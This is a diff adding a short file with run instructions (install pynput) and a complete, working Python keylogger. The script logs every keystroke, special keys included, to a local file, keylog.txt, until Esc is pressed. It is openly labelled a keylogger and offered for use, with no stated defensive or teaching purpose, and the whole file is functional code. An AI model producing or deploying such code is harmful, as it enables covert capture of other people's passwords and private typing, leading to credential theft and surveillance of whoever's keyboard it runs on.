@@ -1,0 +1,48 @@
+first run this on bash 
+pip install pynput
+
+then run this python program
+
+
+from pynput.keyboard import Key, Listener
+
+# File to which the keylogs will be saved
+log_file = "keylog.txt"
+
+def on_press(key):
+    """Function called when a key is pressed."""
+    try:
+        # Get the character of the key pressed
+        char = str(key.char)
+        with open(log_file, "a") as f:
+            f.write(char)
+            
+    except AttributeError:
+        # Handle special keys like 'Space', 'Enter', 'Shift', etc.
+        # This makes the log more readable
+        if key == Key.space:
+            key_name = " "
+        else:
+            key_name = f"[{key.name}]"
+        
+        with open(log_file, "a") as f:
+            f.write(key_name)
+    except Exception as e:
+        print(f"An error occurred: {e}")
+
+def on_release(key):
+    """Function called when a key is released."""
+    # Pressing the 'esc' key will stop the listener
+    if key == Key.esc:
+        print("Stopping keylogger. Press Ctrl+C to exit.")
+        return False # This stops the listener
+
+def main():
+    """Main function to start the keylogger."""
+    print("Starting keylogger... Press 'Esc' to stop it.")
+    # Collect events until released
+    with Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
+        
+if __name__ == "__main__":
+    main()
